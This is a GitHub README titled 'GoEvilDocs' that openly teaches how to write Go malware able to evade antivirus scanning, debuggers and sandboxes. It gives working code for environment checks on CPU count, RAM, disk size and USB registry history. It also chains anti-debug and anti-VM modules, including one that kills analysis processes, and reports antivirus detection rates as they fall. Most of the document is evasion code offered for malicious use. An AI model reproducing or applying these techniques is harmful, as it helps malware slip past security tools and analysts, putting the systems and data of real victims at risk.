# GoEvilDocs
Malware development in Go, learn today, anti dynamic analysis &amp; Static &amp; sandboxes. 
<a href="https://t.me/pulzetools"><img src="https://img.shields.io/badge/Join%20my%20Telegram%20group-2CA5E0?style=for-the-badge&logo=telegram&labelColor=db44ad&color=5e2775"></a>

# Introduction:
- Welcome to GoEvilDocs, your guide to using Go for developing malware that bypasses dynamic analysis, static detection, and sandbox environments. Explore advanced techniques to ensure your malicious Go applications evade detections.

## Malware Dev - Part 1
- Analyzing Blank Go File.
![image](https://github.com/EvilBytecode/GoEvilDocs/assets/151552809/2f23033d-13d2-4179-a94a-cbbbf04e63c7)

```go
package main

func main() {
}
```
- We've gotten 8/72, for blank file. lets add some checks to make it less.
---
## We will try now a Hardware resources, HDD, CPU, Ram Check:
 ![image](https://github.com/EvilBytecode/GoEvilDocs/assets/151552809/3e10277f-c4c1-4a7c-97df-3c7cdc734900)

```go
package main

/*
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

BOOL checksysreq() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) {
        return FALSE;
    }

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = (DWORD)(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048) {
        return FALSE;
    }

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open HDD\n");
        return FALSE;
    }

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return FALSE;
    }

    DWORD diskSizeGB = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / (1024 * 1024 * 1024));
    CloseHandle(hDevice);
    if (diskSizeGB < 100) {
        return FALSE;
    }

    return TRUE;
}
*/
import "C"
import (
    "fmt"
)

func main() {
    fmt.Println("Checking system requirements...")
    if C.checksysreq() == C.BOOL(1) {
        fmt.Println("System meets the minimum requirements.")
    } else {
        fmt.Println("System does not meet the minimum requirements.")
    }
}

```
--- 
### Now lets try more techniques: 
- USB Mounted in (Check if USB Was plugged inside computer before)
- Detection Rate:
![image](https://github.com/EvilBytecode/GoEvilDocs/assets/151552809/6f626b0e-df67-480f-a46a-c34471674f68)
```go
package main

import (
	"log"
	"os/exec"
	"strings"
)

// PluggedIn checks if USB devices were ever plugged in and returns true if found, false otherwise.
func PluggedIn() (bool, error) {
	usbcheckcmd := exec.Command("reg", "query", "HKLM\\SYSTEM\\ControlSet001\\Enum\\USBSTOR")
	outputusb, err := usbcheckcmd.CombinedOutput()
	if err != nil {
		log.Printf("Error running reg query command: %v", err)
		return false, err
	}

	usblines := strings.Split(string(outputusb), "\n")
	pluggedusb := 0
	for _, line := range usblines {
		if strings.TrimSpace(line) != "" {
			pluggedusb++
		}
	}

	if pluggedusb > 0 {
		return true, nil
	}

	return false, nil
}

func main() {
	pluggedIn, err := PluggedIn()
	if err != nil {
		log.Fatalf("Error checking USB devices: %v", err)
	}

	if pluggedIn {
		log.Println("USB devices were plugged in.")
	} else {
		log.Println("No USB devices were ever plugged in.")
	}
}
```
---
### Lets now use GoDefender:
```go
package main

import (
	"log"

	// AntiDebug
	"github.com/EvilBytecode/GoDefender/AntiDebug/CheckBlacklistedWindowsNames"
	"github.com/EvilBytecode/GoDefender/AntiDebug/InternetCheck"
	"github.com/EvilBytecode/GoDefender/AntiDebug/IsDebuggerPresent"
	"github.com/EvilBytecode/GoDefender/AntiDebug/KillBadProcesses"
	"github.com/EvilBytecode/GoDefender/AntiDebug/ParentAntiDebug"
	"github.com/EvilBytecode/GoDefender/AntiDebug/RunningProcesses"
	"github.com/EvilBytecode/GoDefender/AntiDebug/RemoteDebugger"
	"github.com/EvilBytecode/GoDefender/AntiDebug/pcuptime"

	// AntiVirtualization
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/KVMCheck"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/MonitorMetrics"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RecentFileActivity"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/TriageDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/UsernameCheck"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VirtualboxDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMWareDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/USBCheck"

)

func main() {
	// AntiDebug checks
	if connected, _ := InternetCheck.CheckConnection(); connected {
		log.Println("[DEBUG] Internet connection is present")
	} else {
		log.Println("[DEBUG] Internet connection isn't present")
	}

	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
		log.Println("[DEBUG] ParentAntiDebug check failed")
	} else {
		log.Println("[DEBUG] ParentAntiDebug check passed")
	}

	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
		log.Println("[DEBUG] Running processes count detected")
	} else {
		log.Println("[DEBUG] Running processes count passed")
	}

	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
		log.Println("[DEBUG] PC uptime detected")
	} else {
		log.Println("[DEBUG] PC uptime passed")
	}

	KillBadProcesses.KillProcesses()
	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()
	// Other AntiDebug checks
	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
		log.Println("[DEBUG] Debugger presence detected")
	} else {
		log.Println("[DEBUG] Debugger presence passed")
	}

	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
		log.Println("[DEBUG] Remote debugger detected")
	} else {
		log.Println("[DEBUG] Remote debugger passed")
	}
	//////////////////////////////////////////////////////

	// AntiVirtualization checks
	if recentFileActivityDetected, _ := RecentFileActivity.RecentFileActivityCheck(); recentFileActivityDetected {
		log.Println("[DEBUG] Recent file activity detected")
	} else {
		log.Println("[DEBUG] Recent file activity passed")
	}

	if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
		log.Println("[DEBUG] VMWare detected")
	} else {
		log.Println("[DEBUG] VMWare passed")
	}

	if virtualboxDetected, _ := VirtualboxDetection.GraphicsCardCheck(); virtualboxDetected {
		log.Println("[DEBUG] Virtualbox detected")
	} else {
		log.Println("[DEBUG] Virtualbox passed")
	}

	if kvmDetected, _ := KVMCheck.CheckForKVM(); kvmDetected {
		log.Println("[DEBUG] KVM detected")
	} else {
		log.Println("[DEBUG] KVM passed")
	}

	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
		log.Println("[DEBUG] Blacklisted username detected")
	} else {
		log.Println("[DEBUG] Blacklisted username passed")
	}

	if triageDetected, _ := TriageDetection.TriageCheck(); triageDetected {
		log.Println("[DEBUG] Triage detected")
	} else {
		log.Println("[DEBUG] Triage passed")
	}
	if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
		log.Println("[DEBUG] Screen size is small")
	} else {
		log.Println("[DEBUG] Screen size is not small")
	}
	// USBCheck
	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
			log.Println("[DEBUG] Error checking USB devices:", err)
	} else if usbPluggedIn {
			log.Println("[DEBUG] USB devices have been plugged in, check passed.")
	} else {
			log.Println("[DEBUG] No USB devices detected")
	}

}
```
- Results:
- ![image](https://github.com/EvilBytecode/GoEvilDocs/assets/151552809/da394b99-4e37-470b-b6af-cf5c134e684b)
